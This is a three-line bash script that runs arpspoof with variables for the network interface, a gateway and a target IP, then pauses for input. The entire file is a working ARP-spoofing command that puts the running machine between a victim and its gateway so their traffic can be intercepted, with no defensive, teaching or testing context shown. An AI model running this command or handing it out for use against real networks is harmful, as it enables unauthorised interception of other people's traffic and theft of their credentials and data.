#! /bin/bash
arpspoof -i $GATEINT -t $GATENM $TARGIP
read
